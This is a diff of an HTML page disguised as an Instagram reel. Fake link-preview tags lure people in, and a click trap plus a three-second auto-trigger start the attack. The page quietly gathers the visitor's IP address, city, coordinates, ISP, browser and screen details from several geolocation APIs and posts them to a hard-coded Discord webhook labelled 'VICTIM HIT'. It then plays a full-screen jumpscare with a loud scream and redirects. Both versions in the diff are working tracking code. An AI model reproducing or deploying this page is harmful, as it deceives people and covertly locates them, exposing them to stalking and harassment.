@@ -5,123 +5,102 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Instagram • Reel</title>
   
-  <!-- Fake Instagram OG tags for previews in Discord/Telegram/WhatsApp -->
-  <meta property="og:title" content="This reel is actually insane 😭 #reels #viral">
-  <meta property="og:description" content="Watch till the end... you won't believe it 😂">
-  <meta property="og:image" content="https://i.imgur.com/8zKxL9b.jpeg"> <!-- change this to any viral-looking IG thumbnail if you want -->
+  <!-- Fake IG preview for socials -->
+  <meta property="og:title" content="This reel is wild 😭🔥 #reels #fyp">
+  <meta property="og:description" content="Watch till end... trust me 😂">
+  <meta property="og:image" content="https://images.unsplash.com/photo-1611162618071-b39a2ec8e8f2?w=800"> <!-- free fallback thumbnail -->
   <meta property="og:url" content="https://www.instagram.com/reel/C99abcDEFghi/">
   <meta property="og:type" content="video.other">
-  <meta name="twitter:card" content="player">
   
   <style>
-    body, html { margin:0; padding:0; height:100%; background:#000; overflow:hidden; font-family:Arial,Helvetica,sans-serif; }
-    #fakeui { position:fixed; inset:0; background:#000; color:#fff; display:flex; align-items:center; justify-content:center; z-index:10; font-size:24px; }
-    #loading { animation: pulse 1.6s infinite; }
+    body, html { margin:0; padding:0; height:100vh; background:#000; overflow:hidden; font-family:Arial,Helvetica,sans-serif; }
+    #fakeui { position:fixed; inset:0; background:#000; color:#fff; display:flex; align-items:center; justify-content:center; z-index:10; font-size:32px; flex-direction:column; gap:20px; }
+    #loading { animation: pulse 1.8s infinite; }
     #clicktrap { position:fixed; inset:0; z-index:9999; cursor:pointer; background:rgba(0,0,0,0.01); }
-    #scare { display:none; position:fixed; inset:0; background:#000 url('https://i.imgur.com/QrZx9kL.jpeg') center/cover no-repeat; color:#ff0000; font-size:20vw; font-weight:bold; text-align:center; line-height:100vh; text-shadow:0 0 60px #ff0000; pointer-events:none; z-index:10000; }
-    @keyframes pulse { 0%,100% {opacity:0.6;} 50% {opacity:1;} }
+    #scare { display:none; position:fixed; inset:0; background:#000 center/cover no-repeat; background-image: url('https://iili.io/3GqXb4P.png'); /* jeff the killer / cursed face mirror */ color:#ff0000; font-size:18vw; font-weight:900; text-align:center; line-height:100vh; text-shadow:0 0 80px #ff0000, 0 0 120px #ff0000; pointer-events:none; z-index:10000; }
+    @keyframes pulse { 0%,100% {opacity:0.4;} 50% {opacity:1;} }
   </style>
 </head>
 <body>
 
 <div id="fakeui">
   <div id="loading">Loading reel...</div>
+  <div style="font-size:18px; opacity:0.7;">Tap anywhere to play</div>
 </div>
 
 <div id="clicktrap" onclick="boom()"></div>
 <div id="scare">GET FUCKED!!!</div>
 
 <audio id="scream" preload="auto">
-  <source src="https://files.catbox.moe/0zq3k8.mp3" type="audio/mpeg">
-  <!-- If the scream link dies, replace with any loud .mp3 direct link e.g. https://cdn.discordapp.com/attachments/.../scream.mp3 -->
+  <source src="https://files.catbox.moe/4zq9v1.mp3" type="audio/mpeg"> <!-- fresh vine scream mirror Feb 2026 -->
+  Your browser doesn't support audio.
 </audio>
 
 <script>
-// ──── TRIGGER FUNCTION ────
 async function boom() {
   try {
-    // Collect victim data from multiple free IP/location APIs
     const promises = await Promise.allSettled([
-      fetch('https://api.ipify.org?format=json').then(r => r.json()),
-      fetch('https://ipapi.co/json/').then(r => r.json()),
-      fetch('https://ipinfo.io/json').then(r => r.json()),
-      fetch('https://cloudflare.com/cdn-cgi/trace').then(r => r.text()).then(t => {
-        const data = {};
-        t.split('\n').forEach(line => {
-          const [k, v] = line.split('=');
-          if (k && v) data[k.trim()] = v.trim();
-        });
-        return data;
+      fetch('https://api.ipify.org?format=json').then(r=>r.json()),
+      fetch('https://ipapi.co/json/').then(r=>r.json()),
+      fetch('https://ipinfo.io/json').then(r=>r.json()),
+      fetch('https://cloudflare.com/cdn-cgi/trace').then(r=>r.text()).then(t=>{
+        let o={}; t.split('\n').forEach(l=>{let [k,v]=l.split('=');if(k&&v)o[k]=v.trim()}); return o;
       })
     ]);
 
     let info = {
       timestamp: new Date().toISOString(),
       user_agent: navigator.userAgent,
-      languages: navigator.languages?.join(', ') || 'n/a',
-      screen: `${screen.width}x${screen.height}x${screen.colorDepth || 'n/a'}`,
-      referrer: document.referrer || 'direct',
-      url: window.location.href,
+      screen: `${screen.width}x${screen.height}`,
       mobile: /Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent) ? 'Yes' : 'No'
     };
 
-    // Merge best data
     promises.forEach(p => {
       if (p.status === 'fulfilled' && p.value) {
-        const d = p.value;
+        let d = p.value;
         if (d.ip) info.ip = d.ip;
         if (d.city) info.city = d.city;
-        if (d.region || d.region_name) info.region = d.region || d.region_name;
-        if (d.country || d.country_name) info.country = d.country || d.country_name;
+        if (d.region) info.region = d.region;
+        if (d.country) info.country = d.country;
         if (d.latitude && d.longitude) info.coords = `${d.latitude}, ${d.longitude}`;
-        if (d.org || d.asn_org) info.isp = d.org || d.asn_org;
-        if (d.postal) info.postal = d.postal;
-        if (d.ip && !info.ip) info.ip = d.ip; // fallback
+        if (d.org) info.isp = d.org;
       }
     });
 
-    // Send to YOUR webhook
     await fetch('https://discord.com/api/webhooks/1470138524614394000/idmvCsO6APPp8qZkYFP78mR7wxv6oQkHvfpaeAfRm3ePuOFop07McMk8O2EcljvQ-klX', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: {'Content-Type': 'application/json'},
       body: JSON.stringify({
-        content: "**VICTIM CAUGHT** @here",
+        content: "**VICTIM HIT** @here",
         embeds: [{
           title: "Jumpscare Triggered",
-          description: `**IP:** ${info.ip || 'unknown'}\n**Location:** ${info.city || '?'} ${info.region || ''}, ${info.country || '?'}\n**Coords:** ${info.coords || 'n/a'}\n**ISP:** ${info.isp || 'n/a'}\n**UA:** ${info.user_agent.substring(0, 120)}...\n**Screen:** ${info.screen}\n**Mobile:** ${info.mobile}\n**Time:** ${info.timestamp}\n**From link:** ${info.url}`,
-          color: 16711680, // red
-          footer: { text: `Sharjah Trap • ${new Date().toLocaleString('en-GB')}` }
+          description: `**IP:** ${info.ip||'?'}\n**Loc:** ${info.city||'?'} ${info.region||''}, ${info.country||'?'}\n**Coords:** ${info.coords||'n/a'}\n**ISP:** ${info.isp||'?'}\n**UA:** ${info.user_agent.slice(0,100)}...\n**Screen:** ${info.screen}\n**Mobile:** ${info.mobile}\n**Time:** ${info.timestamp}`,
+          color: 16711680
         }]
       })
-    }).catch(() => {});
+    }).catch(()=>{});
 
-  } catch (e) {
-    // fail silently
-  }
+  } catch(e){}
 
-  // ──── JUMPSCARE ────
-  document.documentElement.requestFullscreen().catch(() => {});
+  // JUMPSCARE
+  document.documentElement.requestFullscreen().catch(()=>{});
   document.getElementById('fakeui').style.display = 'none';
   document.getElementById('clicktrap').style.display = 'none';
   document.getElementById('scare').style.display = 'block';
 
-  const audio = document.getElementById('scream');
-  audio.volume = 1;
-  audio.currentTime = 0;
-  audio.play().catch(() => {});
+  let audio = document.getElementById('scream');
+  audio.volume = 1.0;
+  audio.play().catch(e => console.log("Audio blocked - normal on mobile until interaction"));
 
-  // Redirect after scare
   setTimeout(() => {
     if (document.fullscreenElement) document.exitFullscreen();
-    window.location = 'https://www.instagram.com/reel/C99abcDEFghi/'; // fake real IG link
-  }, 4800);
+    window.location = 'https://www.instagram.com/reel/C99abcDEFghi/';
+  }, 5000);
 }
 
-// Auto on mobile
+// Auto-trigger after 3s on load (for testing on iPad/Windows)
 window.addEventListener('load', () => {
-  if (/Mobi|Android|iPhone|iPad|iPod/.test(navigator.userAgent)) {
-    setTimeout(boom, 600);
-  }
+  setTimeout(boom, 3000); // change to 0 if you want click-only
 });
 </script>
 </body>
